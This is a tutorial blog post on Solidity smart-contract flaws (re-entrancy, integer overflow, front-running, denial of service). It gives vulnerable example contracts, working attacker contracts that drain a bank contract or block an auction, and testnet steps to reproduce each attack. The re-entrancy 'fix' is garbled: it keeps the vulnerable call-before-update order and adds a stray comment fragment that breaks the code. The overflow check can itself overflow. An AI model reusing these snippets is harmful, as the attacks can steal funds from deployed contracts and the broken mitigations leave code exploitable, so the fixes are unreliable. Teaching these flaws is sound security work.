+++
title = "Solidity Vulnerabilities"
date = "2022-06-08T23:35:09+05:30"
author = "Somesh Banerjee"
authorTwitter = "banerjee_somesh"
cover = ""
tags = ["Solidity", "Solidity-Vulnerabilities", "Smart-Contract-Vulnerabilities"]
keywords = ["Solidity", "Ethereum", "Smart-Contract"]
description = ""
showFullContent = false
readingTime = true
+++

# Introduction

Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others. 

However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable. 

In this article, I will go through some of the common solidity vulnerabilities in detail. We will try to recreate the  vulnerabilities in the contract to understand it and also discuss how to mitigate these pitfalls.

# Re-entrancy attack

Re-entrancy attack is a type of attack where the malicious contract re-enters the target contract by calling the target contract's function before the completion of its current execution.

To understabd how it is happening, let's understand it by considering contracts as persons. Imagine Person B who acts as a bank and maintain a registry for tracking the balance of other people. Now a malicious Person H deposits 100 money to B. B updates H's balance in the registry to 100. Other persons have also deposited to B and the total value depositted is 1200.

Whenever anybody withdraw money from B, he first gives the money and then update it in the registry. Now imagine H withdraws his money i.e. 100, and before it gets updated he agains withdraw it. Since the registry is not updated he agains get 100. H continues withdrawing until B has 0 balance.

This sounds absurd in real life, that a person withdraws but he can withdraw again before the registry gets updated, but in smart contract, this is possible using `fallback` functions. There is a function called `receive()` which gets called everytime some ether is transferred to a contract.

Let create a vulnerable contract Bank and try to recreate the attack.
```java
pragma solidity ^0.8.7;

contract Bank {
    mapping (address => uint256) userBalance;
   
   // returns the balance of the user passed as parameter
    function getBalance(address u) public view returns(uint256){
        return userBalance[u];
    }

    // returns the balance of the contract
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    // deposit the amount passed with the call to the balance of the user
    function addToBalance() public payable{
        userBalance[msg.sender] += msg.value;
    }   

    // withdraw the whole balance of the user
    function withdrawBalance() public payable  {
        (bool sent, ) = msg.sender.call{value: userBalance[msg.sender]}("");
        userBalance[msg.sender] = 0;
    }   
}
```

Now we will create the Attacker contract, that will drain the Bank contract using the `receive` fallback function 

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Hacker {
    Bank bank;

    constructor(address _a) {
        bank = Bank(_a);
    }
    
    // returns the balance of the contract
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    // attack the bank contract
    function attack() public payable {
        require(msg.value >= 1 ether); 
        bank.addToBalance{value: msg.value}();
        bank.withdrawBalance();
    }

    // fallback function which is called when the bank contract sends the ether
    receive() external payable {
        if(bank.getBalance() > 0){
            bank.withdrawBalance();
        }
    }
}
```

To understand the flow, first deploy the `Bank` contract in the testnet and deposit 1 or more ether from multiple accounts/wallets. Now deploy the `Hacker` contract. Pass the `Bank` contract's address while deploying. Call the `attack()` function of the `Hacker` contract with 1 ether value. After the call, you will notice that the balance of `Bank` contract will be 0 and all the ether which was in `Bank` is transferred to `Hacker`.

What is happening here is, when we call the `attack()` function, the `Hacker` contract first deposits 1 ether in the ` Bank` contract. After that `Hacker` calls the `Bank.withdrawBalance()` function. By calling the `withdrawBalance()` function, the `Bank` transfers the userBalnce of `Hacker` i.e. 1 ether to `Hacker`.

Now in `Hacker` we have defined the fallback function `receive()` which is called when the 1 ether is transferred to the contract. In the `receive()` function, we are again calling the `withdrawBalance()`.

Now understand the `withdrawBalance()` function flow in this case from the following snippet

```js
function withdrawBalance() public payable  {
    (bool sent, ) = msg.sender.call{value: userBalance[msg.sender]}("");
    // . --> receive() is called at his point after transferring and before updating the userBalance
    userBalance[msg.sender] = 0;
}  
```

From the above snippet you can understand, that wen the `receive()` is being called the `userBalace` mapping is not yet updated. Hence again 1 ether will be transferred. This transfer will again triger the `receive()` and the process will go on recursively till it totally drains the `Bank` contract.

#### How to mitigate

To mitigate the reentrancy attack in the above scenario, we can just change the order of execution as follw:
```js
function withdrawBalance() public payable  {
    (bool sent, ) = msg.sender.call{value: userBalance[msg.sender]}("");transferring and before updating the userBalance
    userBalance[msg.sender] = 0;
} 
``` 
Now if the Hacker recursively calls the `withdrawBalance()` function, no ether will be transferred as the mapping is updated. So to avoid reentrancy first update the state variables and then interact with external contracts/wallets.

Another way to prevent reentrancy is by using reentrancy guard. You can use state variables and modifier to design a guard, that will lock the function untill the execution is complete. For example:
```js
modifier nonReentrant() {
    require(!locked, "Reentrant call detected");
    locked = true;
    _;
    locked = false;
}
```
Also you can use [Openzeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) instead of creating your own modifier.

# Integer Overflow

Overflow occurs when we exceed the limit of any variable. For example `uint8` can store value between 0 to 255, and if we try to store 256, it will store it as 0. We can try this by writing the following contract:

```java
pragma solidity ^0.7.0;

contract Overflow {
    uint8 public val = 0;
    
    function add(uint8 value) external {
        val += value; // possible overflow
    } 
}
```

Try adding 255 and check the value. It will show 255. Now if you add 1, `val` will become 0.

#### How to mitigate

The best way to avoid overflow is to upgrade solidity version to 0.8.0 or later, to get built-in protection against overflow and underflow.

Moreover you can perform check before performing a calculation like:
```java
pragma solidity ^0.7.0;

contract Overflow {
    uint8 public val = 0;
    
    function add(uint8 value) external {
        require(val + value <= 255, "Overflow");
        val += value;
    } 
}
```

# Race Condition

In Ethereum or any other chain, every transaction is first added to the mempool and then a miner adds the transaction to the blockchain while mining. There is a time gap of around 10 seconds or more between this two process: sending a transaction and getting it accepted into blockchain.


To recreate the flaw, let create the following scenario:

Deploy a ERC20 token as follow:
```java
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LOL is ERC20 {
    constructor() ERC20("LOL", "LOL") {
        _mint(msg.sender, 100000);
    }
}
```

Now deploy a `Marketplace` contract which uses the above ERC20 token buying and selling:
```java
contract MarketPlace {
    address public owner;
    mapping(uint256 => uint256) public prices;
    mapping(uint256 => address) public holder;
    LOL lol;

    constructor(address a_){
        owner = msg.sender;
        lol = LOL(a_);
    }

    function buy(uint256 id) external {
        lol.transferFrom(msg.sender, owner, prices[id]);
        holder[id] = msg.sender;
    }

    function changeprice(uint256 id, uint256 new_price) external {
        prices[id] = new_price;
    }
}
```
First use `changePrice(1,10)` to set price of id 1 to 10. Now use two different metamask wallets, let A and B to do the attack. A will change the price and B will buy the id 1.
Before performing this approve `Marketplace` contract for spending the ERC20 token on behalf of B, using the `approve(spender,amount)` function. Set the amount higher than the price to make the attack possible. To be safe always approve only the price in real scenarios.

Now call the following functions in order:
1. `buy(1)` from B with lower gasprice, so that it takes more time to get accepted. Remember at this point the price of id 1 is 10, so 10 should be deducted from B's wallet.
2. `changePrice(1,50)` from A with higher gasprice, so that it is accepted instantly.

After both the transactions are complete, you will see 50 is deducted from B wallet.

#### Scenario 2

There can be another scenario for this attack. Imagine you created a Quiz contract and the first one to respond with correct answer wins ether. Now a valid winner submits his answer in the mempool. A malicious miner notice that transaction, copies the values and send a transaction with the correct answer. If the miner's transaction gets added to the block, he will win the ether instead of the actual winner.

#### How to mitigate

We can't prevent front-run but we can follow necessary steps based on the scenario.
For example in the first scenario, only approve for the amount shown as price.
In the second scenario, we can use some kind of encryption to hide the answer from public.

# DoS Attacks

DoS Attack occurs when a malicious hacker succeeds in creating a scenario where your contract functions always fails. For example if we consider the following `Auction` contract:

```java
pragma solidity ^0.8.7;

contract Auction {
    address public curWinner;
    uint256 public curBid;
    
    function bid() payable external {
        uint256 value = msg.value;
        require(value > curBid);
        if (curWinner != address(0)) {
            payable(curWinner).transfer(curBid);
        }
        curWinner = msg.sender;
        curBid = value;
    } 
}
```
Here while bidding, the function first send the value of 2nd highest bid back and then updates the `curBid` and `curWinner`. If a hacker creates a contract through which he can place a bid but any transfer back to the contract will always fail then the winner will never update and he will be winner with any bid. The hacker can achive that using the following `Attacker` contract:
```java
contract Attacker{
    Auction auction;

    constructor(address a){
        auction = Auction(a);
    }

    function placeBid() payable external {
        auction.bid{value: msg.value}();
    }

    receive() external payable  {
        revert("Hacked");
    }
}
```
In `Attacker` contract, ether cannot be transferred back as the fallback function `receive()` will always revert it.

Another scenario includes looping over dynamic size arrays. If the array becomes too large than it will run out of gas and revert.

#### How to mitigate
To avoid function failure due to transfer failure, implement pull over push pattern. In this pattern, you will not send the amount while calling the `bid()` function but a separate function will be there so that the losing bidders can withdraw their bids.



**References:**
1. [(Not So) Smart Contracts](https://github.com/crytic/not-so-smart-contracts)
2. [Smart Contracts common vulnerabilities (solidity)](https://medium.com/coinmonks/smart-contracts-common-vulnerabilities-solidity-e64c5506b7f4)


